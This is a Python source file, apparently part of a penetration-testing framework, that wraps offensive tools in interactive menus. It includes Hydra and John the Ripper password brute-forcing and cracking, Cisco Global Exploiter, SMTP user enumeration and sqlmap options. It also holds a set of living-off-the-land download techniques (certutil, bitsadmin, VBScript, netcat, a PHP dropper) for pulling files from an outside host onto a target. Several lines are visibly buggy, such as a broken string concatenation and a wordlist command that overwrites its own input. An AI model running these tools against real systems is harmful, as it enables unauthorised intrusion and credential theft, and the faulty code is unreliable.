
from Session import *
from ToolManager import *

class CustomWordlist(Tool):
    def __init__(self):
        self._desc = 'This tool will utilize a few methods for creating a custom wordlist.\n' + \
            'html2dic from downloaded HTML.\n' + \
            'cewl to removed duplicates.\n' + \
            'john to create rules from the compiled list.'
        self._name = 'CustomWorklist'
        self._example = 'CustomWorklist'
        self._category = ToolCategory.Password
        self._cmd = 'CustomWorklist'
        self._args = ''

    def __repr__(self):
        return super().__repr__()

    def __str__(self):
        return super().__str__()

    def run(self, **args):
        import os
        import glob
        import Utility

        print('Enter output filename > ' , end = '')
        fileName = input()

        print('This is going to create a custom wordlist based on HTML pages downloaded, continue(Y/N)? > ' , end = '')
        choice = input()
        if choice.lower() != 'y':
            print('> ' , end = '')
            return
        print('Enter output directory (typically [session]/intel/httrack > ', end = '')
        choice = input()
        arry = Utility.getAllFiles(choice)
        for file in arry:
            self.convertToDict(file, fileName)

        # Use John to mangle
        session.runCmdSimple('john ---wordlist=' + fileName + ' --rules --stdout > ' + fileName, 'Running John to create mangled wordlist', fileName)

        # Remove duplicates
        print('Removing duplicates')
        session.runsimple('awk \'!seen[$0]++\' ' + session.getWorkingDir() + +'/' + fileName, 'Removing duplicates', fileName)
        print('File created in the session\'s working directory')

    def convertToDict(self, file, outputFile):
        session.runCmdSimple('html2dic ' + file + ' >>' + session.getWorkingDir() +  '/' + outputFile)

        return

class HydraCustom(Tool):
    def __init__(self):
        self._desc = 'Step by step options for Hydra'
        self._name = 'HydraCustom'
        self._example = 'hydra -s 22 -L users.txt -u -P /usr/share/wordlists/rockyou.txt -t 16 -e nsr -o ${working_dir}/loot/hydra.out ssh SERVICE://TARGET'
        self._category = ToolCategory.Password
        self._cmd = 'HydraCustom'
        self._args = ''       

    def __repr__(self):
        return super().__repr__()

    def __str__(self):
        return super().__str__()

    def run(self, **args):
        # hydra -s 22 -L users.txt -u -P /usr/share/wordlists/rockyou.txt -t 16 -e nsr -o ${working_dir}/loot/hydra.out ssh SERVICE://TARGET

        cmd = 'hydra -t 2 -e nsr -o ' + session.getWorkingDir() + '/loot/hydra.out'

        print('perform an SSL connect (y/N)? > ', end = '')
        choice = input()
        if choice.lower() == 'y':
            cmd = cmd + ' -S '

        print('Enter the PORT > ', end = '')
        port = input()
        if port != '':
            cmd = cmd + ' -s ' + port

        print('1 = User name list')
        print('2 = Single user')
        print('> ', end = '')
        choice = input()
        if choice == '1':
            print('Enter the USER LIST (' + session.getUserlist() + ') > ', end = '')
            userList = input()
            if userList == '':
                userList = session.getUserlist()
            
            cmd = cmd + ' -L ' + userList
        else:
            print('Enter user name > ', end = '')
            cmd = cmd + ' -l ' + input()

        print('Enter the PASSWORD LIST (' + session.getWordlist() + ') > ', end = '')
        passList = input()
        if passList == '':
            passList = session.getWordlist()
        
        cmd = cmd + ' -P ' + passList

        print('Is this a web form brute force (y/n) (Enter to exit) > ', end = '')
        isForm = input()
        if isForm == '':
            return
        elif isForm.lower() == 'y':
            #print('Do we need to run CeWL first? (y/N) > ', end = '')
            #if input().lower() == 'y':
            #    session.toolManager.runByName('CeWL', ToolCategory.Password);

            print('Example: hydra -vv -L passwords.file -P rockyou.txt www.target.com http-post-form "/protected:password=^USER^:do_login=yes:Submit=Log+In:F=success:"')
            print('1 = http-head')
            print('2 = https-head')
            print('3 = http-get')
            print('4 = https-get')
            print('5 = http-post')
            print('6 = https-post')
            print('7 = http-get-form')
            print('8 = https-get-form')
            print('9 = http-post-form')
            print('10 = https-post-form')
            print('11 = http-proxy')
            print('12 = http-proxy-urlenum')
            print('(Enter to exit)')
            print('> ', end = '')
            httpMethod = input()
            if httpMethod == '1':
                httpMethod = 'http-head'
            elif httpMethod == '2':
                httpMethod = 'https-head'
            elif httpMethod == '3':
                httpMethod = 'http-get'
            elif httpMethod == '4':
                httpMethod = 'https-get'
            elif httpMethod == '5':
                httpMethod = 'http-post'
            elif httpMethod == '6':
                httpMethod = 'https-post'
            elif httpMethod == '7':
                httpMethod = 'http-get-form'
            elif httpMethod == '8':
                httpMethod = 'https-get-form'
            elif httpMethod == '9':
                httpMethod = 'http-post-form'
            elif httpMethod == '10':
                httpMethod = 'https-post-form'
            elif httpMethod == '11':
                httpMethod = 'http-proxy'
            elif httpMethod == '12':
                httpMethod = 'http-proxy-urlenum'
            else:
                return
            cmd += ' ' + session.getRemoteHost() + ' ' + httpMethod

            print('Example 1: \'/test/login.php?username=^USER^&password=^PASS^:Bad password\'')
            print('Example 2: hydra -vv -L passwords.file -P file.txt target http-post-form "/protected:password=^USER^:do_login=yes:Submit=Log+In:F=success:"')
            print('Enter page and path, do not include the host, do not add quotes (enter to exit) > ', end = '')
            url = input()
            if url == '':
                return
            cmd += ' \'' + url + '\''
        else:
            print('afp\t\tcisco\t\tcisco-enable\t\tcvs\r\n' + \
                  'firebird\tftp\t\thttp-get\t\thttp-head\r\n' + \
                  'http-proxy\thttps-get\thttps-head\t\thttps-form-get\r\n' + \
                  'https-form-post\ticq\t\timap\t\t\timap-ntlm\r\n' + \
                  'ldap2\t\tldap3\t\tmssql\t\t\tmysql\r\n' + \
                  'ncp\t\tnntp\t\toracle-listener\t\tpcanywhere\r\n' + \
                  'pcnfs\t\tpop3\t\tpop3-ntlm\t\tpostgres\r\n' + \
                  'rexec\t\trlogin\t\trsh\t\t\tsapr3\r\n' + \
                  'sip\t\tsmb\t\tsmbnt\t\t\tsmtp-auth\r\n' + \
                  'smtp-auth-ntlm\tsnmp\t\tsocks5\t\t\tssh2\r\n' + \
                  'teamspeak\ttelnet\t\tvmauthd\t\t\tvnc')
            print('Enter the SERVICE (Enter to exit) > ' , end = '')
            service = input()
            if service == '':
                return
            else:
                cmd += ' ' + service + '://' + session.getRemoteHost()

        outFile = self.compileOutfile()
        session.runThreadedCmd(cmd + outFile, 'HydraCustom')

        return

class BruteSopMultiServer(Tool):
    def __init__(self):
        self._desc = 'This is the SOP for bruting.  Iterate over users instead of passwords, and multiple servers.'
        self._name = 'BruteSopMultiServer'
        self._example = 'BruteSopMultiServer, will need a server list, password list, and user list.'
        self._category = ToolCategory.Password
        self._cmd = 'BruteSopMultiServer'
        self._args = ''       

    def run(self, **args):
        # hydra -s 22 -L users.txt -u -P /usr/share/wordlists/rockyou.txt -M servers.txt -t 16 -e nsr -o ${working_dir}/loot/hydra.out ssh #PORT
        cmd = 'hydra -t 2 -e nsr -o ' + session.getWorkingDir() + '/loot/hydra.out'

        print('Enter the SERVER LIST file > ' , end = '')
        serverList = input()
        if serverList == '':
            return
        else:
            cmd = cmd + ' -M ' + serverList

        print('perform an SSL connect (y/N)? > ', end = '')
        choice = input()
        if choice.lower() == 'y':
            cmd = cmd + ' -S '

        print('Enter the PORT > ' , end = '')
        port = input()
        if port != '':
            cmd = cmd + ' -s ' + port

        print('Enter the USER LIST > ' , end = '')
        userList = input()
        if userList == '':
            return
        else:
            cmd = cmd + ' -L ' + userList + ' -u '

        print('Enter the PASSWORD LIST (rockyou) > ' , end = '')
        passList = input()
        if userList == '':
            passList = '/usr/share/wordlists/rockyou.txt'
        else:
            cmd = cmd + ' -P ' + passList

        print('afp\t\tcisco\t\tcisco-enable\t\tcvs\r\n' + \
              'firebird\tftp\t\thttp-get\t\thttp-head\r\n' + \
              'http-proxy\thttps-get\thttps-head\t\thttps-form-get\r\n' + \
              'https-form-post\ticq\t\timap\t\t\timap-ntlm\r\n' + \
              'ldap2\t\tldap3\t\tmssql\t\t\tmysql\r\n' + \
              'ncp\t\tnntp\t\toracle-listener\t\tpcanywhere\r\n' + \
              'pcnfs\t\tpop3\t\tpop3-ntlm\t\tpostgres\r\n' + \
              'rexec\t\trlogin\t\trsh\t\t\tsapr3\r\n' + \
              'sip\t\tsmb\t\tsmbnt\t\t\tsmtp-auth\r\n' + \
              'smtp-auth-ntlm\tsnmp\t\tsocks5\t\t\tssh2\r\n' + \
              'teamspeak\ttelnet\t\tvmauthd\t\t\tvnc')
        print('Enter the SERVICE > ' , end = '')
        service = input()
        if service == '':
            return
        else:
            cmd = cmd + ' ' + service

        outFile = self.compileOutfile()
        session.runThreadedCmd(cmd + outFile, 'BruteSopMultiServer')

        return

class CiscoGlobalExploiter(Tool):
    def __init__(self):
        self._desc = 'Cisco Global Exploiter (CGE), is an advanced, simple and fast security testing tool.'
        self._name = 'CiscoGlobalExploiter'
        self._example = 'CiscoGlobalExploiter TARGET'
        self._category = ToolCategory.VulnerabilityScanner
        self._cmd = 'CiscoGlobalExploiter'
        self._args = ''

    def __repr__(self):
        return super().__repr__()

    def __str__(self):
        return super().__str__()

    def run(self, **args):
        for i in range(1, 15):
            outFile = ' >> ' + session.getIntelDir() + '/CiscoGlobalExploiter.out'
            #print('cge.pl 192.168.99.230 ' + str(i) + outFile)
            session.runCmdSimple('cge.pl ' + session.getRemoteHost() + str(i) + outFile, self._desc, outFile)

        return

class OpenVAS(Tool):
    def __init__(self):
        self._desc = 'OpenVAS an semi-interactive security scanner with a browser UI.\r\n\r\nhttps://www.kali.org/tutorials/configuring-and-tuning-openvas-in-kali-linux'
        self._name = 'OpenVAS'
        self._example = 'OpenVAS'
        self._category = ToolCategory.VulnerabilityScanner
        self._cmd = 'OpenVAS'
        self._args = ''

    def __repr__(self):
        return super().__repr__()

    def __str__(self):
        return super().__str__()

    def run(self, **args):
        print('Enter new user password > ' , end = '')
        userPass = input()

        print('Enter admin password > ' , end = '')
        adminPass = input()

        session.runCmdSimple('openvas-setup')
        session.runCmdSimple('openvasmd --rebuild')
        session.runCmdSimple('openvas-check-setup')
        session.runCmdSimple('openvasmd --create-user=dookie')
        session.runCmdSimple('openvasmd --user=dookie --new-password=' + userPass)
        session.runCmdSimple('openvasmd --user=admin --new-password=' + adminPass)
        
        print('Check for an open socket to connect to, typically 9390 and 9392')
        session.runCmdSimple('ss -ant', 'Check for an open socket to connect to, typically 9390 and 9392')
        session.runCmdSimple('firefox -new-window https://localhost:9392', 'Starting OpenVAS')

        return

class JohnTheRipperAdvanced(Tool):
    def __init__(self):
        self._desc = 'Hard-coded some more advanced options for John.  \r\nThis might need to be ran on a remote machine because it could take awhile.'
        self._name = 'JohnTheRipperAdvanced'
        self._example = 'JohnTheRipperAdvanced'
        self._category = ToolCategory.Password
        self._cmd = 'JohnTheRipperAdvanced'
        self._args = ''

    def __repr__(self):
        return super().__repr__()

    def __str__(self):
        return super().__str__()

    def run(self, **args):
        print('Enter encrypted file > ' , end = '')
        encrptedFile = input()

        print('Enter password wordlist > ' , end = '')
        passWordlist = input()

        print('Select Mode:')
        print('1 = Wordlist only, but permitting the use of word mangling rules')
        print('2 = Restore a previous session.')
        print('3 = Incremental mode.')
        print('4 = Generate a new charset file')

        cmd = ''
        choice = input()
        if choice == '1':
            cmd = 'john --wordlist=' + passWordlist + ' --rules ' + encrptedFile
        elif choice == '2':
            cmd = 'john --restore'
        elif choice == '3':
            cmd = 'john --incremental ' + encrptedFile
        elif choice == '4':
            print('Enter character file > ', end = '')
            fileName = input()
            print('Enter output file > ', end = '')
            outFile = input()
            cmd = 'john --make-charset=' + fileName + ' ' + outFile

        if len(cmd) > 0:
            session.runThreadedCmd(cmd, 'John The Ripper', self.onComplete)

        return

    def onComplete(self):
        session.runCmdSimple('john --show passwd') 
        print('')
        session.runCmdSimple('john --show --groups=0,1 mypasswd')
        print('')
        session.runCmdSimple('john --show --users=0 mypasswd')
        return

class DownloadFileLinux(Tool):
    def __init__(self):
        self._desc = 'Multiple stragies to downloading a file.\r\n\r\nhttps://xapax.gitbooks.io/security/content/transfering_files_to_windows.html'
        self._name = 'DownloadFile'
        self._example = 'DownloadFile'
        self._category = ToolCategory.Maintaining
        self._cmd = 'DownloadFile'
        self._args = ''

    def __repr__(self):
        return super().__repr__()

    def __str__(self):
        return super().__str__()

    def run(self, **args):
        print('Select Option:')
        print('1 = From URL (WGET)')
        print('2 = Netcat')
        print('3 = Socat')
        print('4 = PHP')
        print('5 = SCP')

        choice = input()
        cmd = ''
        if choice == '1':
            print('Enter URL > ', end = '')
            url = input()
            cmd = 'wget ' + url
        elif choice == '2':
            print('Run this manually:')
            print('Host machine: nc -lvp 4444 < file')
            print('Enter Host IP > ', end = '')
            ip = input()
            print('Enter Host port > ', end = '')
            port = input()
            print('Enter file name > ', end = '')
            fileName = input()
            cmd = 'nc ' + ip + ' ' + port + ' > ' + fileName
        elif choice == '3':
            print('Host machine: socat -u TCP-LISTEN:9876,reuseaddr OPEN:out.txt,creat && cat out.txt')
            print('Enter Host IP > ', end = '')
            ip = input()
            print('Enter Host port > ', end = '')
            port = input()
            print('Enter file name > ', end = '')
            fileName = input()
            cmd = 'socat -u FILE:' + fileName + ' TCP:' + ip + ':' + port
        elif choice == '4':
            print('Enter URL > ', end = '')
            url = input()
            print('Enter file name > ', end = '')
            fileName = input()
            cmd = 'echo "<?php file_put_contents(\'' + fileName + '\', fopen(\'' + url + '\', \'r\')); ?>" > download.php'
        elif choice == '5':
            print('Enter username > ', end = '')
            username = input()
            print('Enter server > ', end = '')
            server = input()
            print('Enter source file > ', end = '')
            source = input()
            print('Enter destination file > ', end = '')
            dest = input()
            cmd = 'scp ' + source + ' ' + username + '@' + server + ':' + dest

        if len(cmd) > 0:
            session.runCmdSimple(cmd, 'Downloading file')

        return

class DownloadFileWindows(Tool):
    def __init__(self):
        self._desc = 'Multiple stragies to downloading a file.\r\n\r\nhttps://xapax.gitbooks.io/security/content/transfering_files_to_windows.html'
        self._name = 'DownloadFile'
        self._example = 'DownloadFile'
        self._category = ToolCategory.Maintaining
        self._cmd = 'DownloadFile'
        self._args = ''

    def __repr__(self):
        return super().__repr__()

    def __str__(self):
        return super().__str__()

    def run(self, **args):
        print('Enter URL of file > ', end = '')
        url = input()

        print('Select Option:')
        print('1 = TFP')
        print('2 = TFTP')
        print('3 = VBScript')
        print('4 = PowerShell')
        print('5 = Debug.exe (instructions)')
        print('6 = certutil')
        print('7 = wget (PowerShell)')
        print('8 = wget clone in VB')
        print('9 = hh.exe')
        print('10 = bitsadmin.exe')
        print('11 = esentutl.exe')
        print('12 = expand.exe')
        print('13 = IEExec.exe')

        choice = input()
        cmd = ''
        if choice == '1':
            print('Enter Host IP > ', end = '')
            ip = input()
            print('Enter Host port > ', end = '')
            port = input()
            print('Enter file name > ', end = '')
            fileName = input()
            print('Enter user name > ', end = '')
            username = input()
            print('Enter password > ', end = '')
            password = input()

            session.runCmdSimple('echo open ' + ip + ' ' + port + ' > ftp.txt')
            session.runCmdSimple('echo USER ' + username + ' >> ftp.txt')
            session.runCmdSimple('echo ' + password + ' >> ftp.txt')
            session.runCmdSimple('echo bin >> ftp.txt')
            session.runCmdSimple('echo GET ' + fileName + ' >> ftp.txt')
            session.runCmdSimple('echo bye >> ftp.txt')
            session.runCmdSimple('ftp -v -n -s:ftp.txt')
            return
        elif choice == '2':
            cmd = 'tftp -i ' + url + ' get file.bin'
        elif choice == '3':
            session.runCmdSimple('echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") > script.vbs')
            session.runCmdSimple('echo dim bStrm: Set bStrm = createobject("Adodb.Stream") >> script.vbs')
            session.runCmdSimple('echo xHttp.Open "GET", "' + url + '", False >> script.vbs')
            session.runCmdSimple('echo xHttp.Send >> script.vbs')
            session.runCmdSimple('echo with bStrm >> script.vbs')
            session.runCmdSimple('echo .type = 1 \'//binary >> script.vbs')
            session.runCmdSimple('echo .open >> script.vbs')
            session.runCmdSimple('echo .write xHttp.responseBody >> script.vbs')
            session.runCmdSimple('echo .savetofile "c:\\file.bin", 2 \'//overwrite >> script.vbs')
            session.runCmdSimple('echo end with >> script.vbs')
            session.runCmdSimple('cscript script.vbs')
            return
        elif choice == '4':
            cmd = 'Invoke-WebRequest -Uri ' + url + ' -OutFile file.bin'
        elif choice == '5':
            print('Use debug.exe on Win32 to rebuild a binary.')
            print('Compress nc.exe (can only assemble 64KB) upx -9 nc.exe')
            print('Disassemble nc.exe: wine exe2bat.exe nc.exe nc.txt')
            print('Then paste the textfile to the target, and rebuild.')
            return
        elif choice == '6':
            cmd = 'certutil -urlcache -f '
            cmd += url + ' -f file.bin'
        elif choice == '7':
            cmd = 'wget ' + url
        elif choice == '8':
            session.runCmdSimple('echo strUrl = WScript.Arguments.Item(0) > wget.vbs')
            session.runCmdSimple('echo StrFile = WScript.Arguments.Item(1) >> wget.vbs')
            session.runCmdSimple('echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs')
            session.runCmdSimple('echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs')
            session.runCmdSimple('echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs')
            session.runCmdSimple('echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs')
            session.runCmdSimple('echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs')
            session.runCmdSimple('echo Err.Clear >> wget.vbs')
            session.runCmdSimple('echo Set http = Nothing >> wget.vbs')
            session.runCmdSimple('echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs')
            session.runCmdSimple('echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs')
            session.runCmdSimple('echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs')
            session.runCmdSimple('echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs')
            session.runCmdSimple('echo http.Open "GET",strURL,False >> wget.vbs')
            session.runCmdSimple('echo http.Send >> wget.vbs')
            session.runCmdSimple('echo varByteArray = http.ResponseBody >> wget.vbs')
            session.runCmdSimple('echo Set http = Nothing >> wget.vbs')
            session.runCmdSimple('echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs')
            session.runCmdSimple('echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs')
            session.runCmdSimple('echo strData = "" >> wget.vbs')
            session.runCmdSimple('echo strBuffer = "" >> wget.vbs')
            session.runCmdSimple('echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs')
            session.runCmdSimple('echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs')
            session.runCmdSimple('echo Next >> wget.vbs')
            session.runCmdSimple('echo ts.Close >> wget.vbs')
            session.runCmdSimple('cscript wget.vbs ' + url + ' file.bin')
            return
        elif choice == '9':
            print('C:/Windows/System32/hh.exe')
            print('C:/Windows/SysWOW64/hh.exe')
            cmd = 'hh.exe ' + url
        elif choice == '10':
            print('Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job. ')
            cmd = 'bitsadmin /create 1 bitsadmin /addfile 1 ' + url + ' ./file.exe bitsadmin /RESUME 1 bitsadmin /complete 1'
        elif choice == '11':
            print('Copies the source EXE to the destination EXE file')
            cmd = 'esentutl.exe /y ' + url + ' /d ./file.bin /o'
        elif choice == '12':
            print('')
            cmd = 'expand \\webdav\folder\file.bat c:\ADS\file.bat'
        elif choice == '13':
            print('C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe')
            print('C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ieexec.exe')
            cmd = 'ieexec.exe ' + url


        if len(cmd) > 0:
            session.runCmdSimple(cmd, 'Downloading file')

        return
        
class SearchsploitNmap(Tool):
    def __init__(self):
        self._desc = 'Runs \'searchsploit\' based on the Nmap files in the \'intel\' directory, and parse the results.'
        self._name = 'searchsploit_nmap'
        self._example = 'searchsploit -j --nmap intel/NMAP_FILE | tee outFile'
        self._category = ToolCategory.Exploit
        self._cmd = 'searchsploit_nmap'
        self._args = ''

    def __repr__(self):
        return super().__repr__()

    def __str__(self):
        return super().__str__()

    def run(self, **args):
        import os
        import glob
        import Parsers
        import Session

        parser = Parsers.ParserSearchSploitNmap()
        dir = Session.session.getIntelDir()
        exploitDir = Session.session.getExploitDir()
        for filename in glob.glob(dir + '/nmap_*'):
            filename = os.path.basename(filename)
            print('\033[94m' + 'Parsing: ' + filename + '\033[0m')
            outFile = exploitDir + '/searchsploit_' + filename + '.json'
            cmd = 'searchsploit -j --nmap ' + dir + '/' + filename + ' | tee ' + outFile
            Session.session.runCmdSimple(cmd, 'Using searchsploit for any known vulnerabilities')
            parser.parseFile(outFile)

        return
        
class SearchsploitTargetHost(Tool):
    def __init__(self):
        self._desc = 'Runs \'searchsploit\' based on the information gathered and stored in the \'Target Host\' object.'
        self._name = 'searchsploit_targethost'
        self._example = 'searchsploit term | tee outFile'
        self._category = ToolCategory.Exploit
        self._cmd = 'searchsploit_targethost'
        self._args = ''

    def __repr__(self):
        return super().__repr__()

    def __str__(self):
        return super().__str__()

    def run(self, **args):
        import os
        import glob
        import Parsers
        import Session

        parser = Parsers.ParserSearchSploit()
        dir = Session.session.getIntelDir()
        exploitDir = Session.session.getExploitDir()
        filename = 'searchsploit_targethost'
        outFile = exploitDir + '/searchsploit_targethost.json'
        
        for service in Session.session.targetHost.getServices():
            serviceName = service.getName()
            if 'samba' in serviceName and 'netbios-ssn' in serviceName:
                serviceName = 'samba'
            
            search = serviceName.replace(',', '') + ' '
            cmd = 'searchsploit -j ' + search + ' | tee ' + outFile
            Session.session.runCmdSimple(cmd, 'Using searchsploit for any known vulnerabilities')
            parser.parseFile(outFile)

        return
        
class SearchsploitCustomSearch(Tool):
    def __init__(self):
        self._desc = 'Runs \'searchsploit\' based on the search term/s from input.'
        self._name = 'searchsploit_customsearch'
        self._example = 'searchsploit term | tee outFile'
        self._category = ToolCategory.Exploit
        self._cmd = 'searchsploit_customsearch'
        self._args = ''

    def __repr__(self):
        return super().__repr__()

    def __str__(self):
        return super().__str__()

    def run(self, **args):
        import Session

        exploitDir = Session.session.getExploitDir()
        outFile = exploitDir + '/searchsploit_customsearch.json'
        
        print('Enter your search terms: ')
        term = input()
        cmd = 'searchsploit -j ' + term + ' | tee ' + outFile
        Session.session.runCmd(cmd, 'seachsploit', self.onComplete, outFile, True)
        return
        
    def onComplete(self, outFile):
        import Parsers
        parser = Parsers.ParserSearchSploit()
        parser.parseFile(outFile)
        return
        
class SmtpUserVerify(Tool):
    def __init__(self):
        self._desc = 'Uses the SMTP VRFY command to verify if there is a user of that name in the system.'
        self._name = 'SmtpUserVerify'
        self._example = 'SmtpUserVerify'
        self._category = ToolCategory.Enumeration
        self._cmd = 'SmtpUserVerify [USERNAME]'
        self._args = ''

    def __repr__(self):
        return super().__repr__()

    def __str__(self):
        return super().__str__()

    def run(self, **args):
        username = ''
        if args is None:
            print('Enter new username > ' , end = '')
            username = input()
        else:
            username = args

        import socket
        import sys
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   # Create a Socket
        connect = s.connect((session.getRemoteHost(), 25))      # Connect to the Server
        banner = s.recv(1024)                                   # Receive the banner
        print(banner)
        s.send('VRFY ' + username + '\r\n')                     # VRFY a user
        result = s.recv(1024)
        print(result)
        s.close()                                               # Close the socket

        return

class SQLMapCustom(Tool):
    def __init__(self):
        self._desc = 'Uses the SMTP VRFY command to verify if there is a user of that name in the system.'
        self._name = 'SQLMapCustom'
        self._example = 'sqlmap -d "mysql://admin:admin@192.168.21.17:3306/testdb" -f --banner --dbs --users'
        self._category = ToolCategory.Web
        self._cmd = 'sqlmap '
        self._args = ''

        self._requests = []
        self._requests.append(Argument('--method', 'Force usage of given HTTP method (e.g. PUT)'))
        self._requests.append(Argument('--data', 'Data string to be sent through POST'))
        self._requests.append(Argument('--param-del', 'Character used for splitting parameter values'))
        self._requests.append(Argument('--cookie', 'HTTP Cookie header value'))
        self._requests.append(Argument('--cookie-del', 'Character used for splitting cookie values'))
        self._requests.append(Argument('--load-cookies', 'File containing cookies in Netscape/wget format'))
        self._requests.append(Argument('--drop-set-cookie', 'Ignore Set-Cookie header from response', '', '', isBool=True))
        self._requests.append(Argument('--user-agent', 'HTTP User-Agent header value'))
        self._requests.append(Argument('--random-agent', 'Use randomly selected HTTP User-Agent header value', '', '', isBool=True))
        self._requests.append(Argument('--host', 'HTTP Host header value'))
        self._requests.append(Argument('--referer', 'HTTP Referer header value'))
        self._requests.append(Argument('-H', 'Extra header (e.g. "X-Forwarded-For: 127.0.0.1")', '', ''))
        self._requests.append(Argument('--headers', 'Extra headers (e.g. "Accept-Language: fr ETag: 123")'))
        self._requests.append(Argument('--auth-type', 'HTTP authentication type (Basic, Digest, NTLM or PKI)'))
        self._requests.append(Argument('--auth-cred', 'HTTP authentication credentials (name:password)'))
        self._requests.append(Argument('--auth-file', 'HTTP authentication PEM cert/private key file'))
        self._requests.append(Argument('--ignore-code', 'Ignore HTTP error code (e.g. 401)'))
        self._requests.append(Argument('--ignore-proxy', 'Ignore system default proxy settings', '', '', isBool=True))
        self._requests.append(Argument('--ignore-redirects', 'Ignore redirection attempts', '', '', isBool=True))
        self._requests.append(Argument('--ignore-timeouts', 'Ignore connection timeouts', '', '', isBool=True))
        self._requests.append(Argument('--proxy', 'Use a proxy to connect to the target URL'))
        self._requests.append(Argument('--proxy-cred', 'Proxy authentication credentials (name:password)'))
        self._requests.append(Argument('--proxy-file', 'Load proxy list from a file'))
        self._requests.append(Argument('--tor', 'Use Tor anonymity network', '', '', isBool=True))
        self._requests.append(Argument('--tor-port', 'Set Tor proxy port other than default'))
        self._requests.append(Argument('--tor-type', 'Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))'))
        self._requests.append(Argument('--check-tor', 'Check to see if Tor is used properly', '', '', isBool=True))
        self._requests.append(Argument('--delay', 'Delay in seconds between each HTTP request'))
        self._requests.append(Argument('--timeout', 'Seconds to wait before timeout connection (default 30)'))
        self._requests.append(Argument('--retries', 'Retries when the connection timeouts (default 3)'))
        self._requests.append(Argument('--randomize', 'Randomly change value for given parameter(s)'))
        self._requests.append(Argument('--safe-url', 'URL address to visit frequently during testing'))
        self._requests.append(Argument('--safe-post', 'POST data to send to a safe URL'))
        self._requests.append(Argument('--safe-req', 'Load safe HTTP request from a file'))
        self._requests.append(Argument('--safe-freq', 'Test requests between two visits to a given safe URL'))
        self._requests.append(Argument('--skip-urlencode', 'Skip URL encoding of payload data', '', '', isBool=True))
        self._requests.append(Argument('--csrf-token', 'Parameter used to hold anti-CSRF token'))
        self._requests.append(Argument('--csrf-url', 'URL address to visit to extract anti-CSRF token'))
        self._requests.append(Argument('--force-ssl', 'Force usage of SSL/HTTPS', '', '', isBool=True))
        self._requests.append(Argument('--hpp', 'Use HTTP parameter pollution method', '', '', isBool=True))
        self._requests.append(Argument('--eval', 'Evaluate provided Python code before the request (e.g."import hashlib;id2=hashlib.md5(id).hexdigest()")'))

        self._optimizations = []
        self._optimizations.append(Argument('-o', 'Turn on all optimization switches', '', '', isBool=True))
        self._optimizations.append(Argument('--predict-output', 'Predict common queries output', '', '', isBool=True))
        self._optimizations.append(Argument('--keep-alive', 'Use persistent HTTP(s) connections', '', '', isBool=True))
        self._optimizations.append(Argument('--null-connection', 'Retrieve page length without actual HTTP response body', '', '', isBool=True))
        self._optimizations.append(Argument('--threads', 'Max number of concurrent HTTP(s) requests (default 1)'))

        self._injections = []
        self._injections.append(Argument('-p', 'Testable parameter(s)', '', '', isBool=True))
        self._injections.append(Argument('--skip', 'Skip testing for given parameter(s)'))
        self._injections.append(Argument('--skip-static', 'Skip testing parameters that not appear to be dynamic', '', '', isBool=True))
        self._injections.append(Argument('--param-exclude', 'Regexp to exclude parameters from testing (e.g. "ses")'))
        self._injections.append(Argument('--dbms', 'Force back-end DBMS to this value'))
        self._injections.append(Argument('--dbms-cred', 'DBMS authentication credentials (user:password)'))
        self._injections.append(Argument('--os', 'Force back-end DBMS operating system to this value'))
        self._injections.append(Argument('--invalid-bignum', 'Use big numbers for invalidating values', '', '', isBool=True))
        self._injections.append(Argument('--invalid-logical', 'Use logical operations for invalidating values', '', '', isBool=True))
        self._injections.append(Argument('--invalid-string', 'Use random strings for invalidating values', '', '', isBool=True))
        self._injections.append(Argument('--no-cast', 'Turn off payload casting mechanism', '', '', isBool=True))
        self._injections.append(Argument('--no-escape', 'Turn off string escaping mechanism', '', '', isBool=True))
        self._injections.append(Argument('--prefix', 'Injection payload prefix string'))
        self._injections.append(Argument('--suffix', 'Injection payload suffix string'))
        self._injections.append(Argument('--tamper', 'Use given script(s) for tampering injection data'))

        self._techniques = []
        self._techniques.append(Argument('--technique', 'SQL injection techniques to use (default "BEUSTQ")'))
        self._techniques.append(Argument('--time-sec', 'Seconds to delay the DBMS response (default 5)'))
        self._techniques.append(Argument('--union-cols', 'Range of columns to test for UNION query SQL injection'))
        self._techniques.append(Argument('--union-char', 'Character to use for bruteforcing number of columns'))
        self._techniques.append(Argument('--union-from', 'Table to use in FROM part of UNION query SQL injection'))
        self._techniques.append(Argument('--dns-domain', 'Domain name used for DNS exfiltration attack'))
        self._techniques.append(Argument('--second-order', 'Resulting page URL searched for second-order response'))

        self._fingerprint = []
        self._fingerprint.append(Argument('--fingerprint', 'Perform an extensive DBMS version fingerprint'))

        self._enumeration = []
        self._enumeration.append(Argument('--all', 'Retrieve everything', '', '', isBool=True))
        self._enumeration.append(Argument('--banner', 'Retrieve DBMS banner', '', '', isBool=True))
        self._enumeration.append(Argument('--current-user', 'Retrieve DBMS current user', '', '', isBool=True))
        self._enumeration.append(Argument('--current-db', 'Retrieve DBMS current database', '', '', isBool=True))
        self._enumeration.append(Argument('--hostname', 'Retrieve DBMS server hostname', '', '', isBool=True))
        self._enumeration.append(Argument('--is-dba', 'Detect if the DBMS current user is DBA', '', '', isBool=True))
        self._enumeration.append(Argument('--users', 'Enumerate DBMS users', '', '', isBool=True))
        self._enumeration.append(Argument('--passwords', 'Enumerate DBMS users password hashes', '', '', isBool=True))
